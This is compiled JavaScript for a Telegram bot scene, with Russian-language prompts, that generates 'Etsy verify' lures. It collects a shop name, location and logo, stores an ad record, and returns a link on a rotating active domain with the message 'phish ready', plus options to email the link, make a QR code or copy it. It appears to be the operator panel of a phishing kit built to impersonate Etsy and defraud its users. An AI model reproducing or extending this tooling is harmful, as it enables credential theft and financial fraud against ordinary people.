"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.scene = exports.composer = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const ads_1 = require("../../../database/models/ads");
const database_1 = require("../../../database");
const getPictureMenu_1 = require("../../../helpers/getPictureMenu");
const moment_1 = __importDefault(require("moment/moment"));
const getFlagEmoji_1 = require("../../../helpers/getFlagEmoji");
const { chromium } = require('playwright');
exports.composer = new grammy_1.Composer();
const regex = /^ad manual creation etsy verify (?<country>\w+)/gmi;
exports.composer.callbackQuery(regex, startScene);
async function startScene(ctx) {
    const data = /^ad manual creation etsy verify (?<country>\w+)/gmi.exec(ctx.callbackQuery.data);
    return ctx.scenes.enter('manualCreationAd-EtsyVerify', {
        country: data.groups.country
    });
}
exports.scene = new grammy_scenes_1.Scene('manualCreationAd-EtsyVerify');
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel manualCreationAd-EtsyVerify', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.createAdManual = {};
    ctx.session.deleteMessage = [];
    ctx.session.service = 'etsy';
    ctx.session.country = ctx.scene.opts.arg.country;
    const res = await ctx.reply(`<b>${(0, getFlagEmoji_1.getFlagEmoji)(ctx.session.country)} Введи название магазина:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.session.tgId = res.message_id;
    ctx.scene.resume();
});
exports.scene.wait().hears(/(^.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.title = ctx.message.text;
    const res = await ctx.reply(`<b>📍 Введи местоположение или отправь null:</b>`, {
        reply_markup: {
            inline_keyboard: [
                // [{text: 'Пропустить', callback_data: 'skip location'}],
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.scene.wait().hears(/(.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.description = ctx.match[1];
    const res = await ctx.reply(`<b>🌌 Скинь лого магазина или отправь null:</b>`, {
        reply_markup: {
            inline_keyboard: [
                // [{text: 'Пропустить', callback_data: 'skip photo'}],
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
// scene.callbackQuery('skip location', async (ctx) => {
//     // const res = await ctx.reply(`<b>🌌 Скинь лого магазина:</b>`, {
//     //     reply_markup: {
//     //         inline_keyboard: [
//     //             [{text: 'Пропустить', callback_data: 'skip photo'}],
//     //             [{text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify'}]
//     //         ]
//     //     }
//     // })
//     console.log(123)
//     return ctx.scene.goto("setPhoto")
// })
//
// scene.label("setPhoto")
exports.scene.wait().on('message', async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    if (ctx.message.photo) {
        const res = await ctx.getFile();
        ctx.session.createAdManual.img = res.file_path;
    }
    else {
        ctx.session.createAdManual.img = "null";
    }
    ctx.scene.resume();
});
exports.scene.do(async (ctx) => {
    const domen = await database_1.domensRepository.findOneBy({ active: true, service: `etsy` });
    if (!domen)
        return ctx.reply('domen undefined error');
    const date = Date.now();
    const ad = new ads_1.Ads();
    ad.price = 'null';
    ad.title = ctx.session.createAdManual.title;
    ad.description = ctx.session.createAdManual.description;
    ad.img = ctx.session.createAdManual.img;
    ad.link = `2333383018-${date}`;
    ad.originallink = 'none';
    ad.deliveryPrice = "null";
    ad.date = `${date}`;
    ad.underService = 'verify';
    ad.country = ctx.session.country;
    ad.service = 'etsy';
    ad.author = ctx.user;
    ad.manualCreation = true;
    await database_1.adsRepository.save(ad);
    await ctx.replyWithPhoto(await (0, getPictureMenu_1.getPictureMenu)(ctx.user), {
        caption: `
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Магазин:</b> <code>${ad.title}</code>
💡 <b>Платформа: ETSY VERIFY [${ctx.session.country.toUpperCase()} ${(0, getFlagEmoji_1.getFlagEmoji)(ctx.session.country)}]</b>
♻️ <b>Домен сменён ${(0, moment_1.default)(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданные ссылки:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
➖➖➖➖➖➖➖
<code>https://${domen.link}/link/${ad.link}</code>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    });
    ctx.scene.exit();
});
const createKeyboard = async (id, user) => {
    const keyb = new grammy_1.InlineKeyboard();
    // .text("🙊 Настройки", `settings ad ${id}`)
    keyb.row();
    keyb.text("💌 EMAIL", `email ad ${id}`);
    keyb.text("🎲 QR-code", `qrcode get ${id}`);
    keyb.row();
    keyb.text("🖇 Создать копию", `etsy verify copy ${id}`);
    keyb.row();
    keyb.text("Главное меню", `menuWithPicture`);
    return keyb;
};
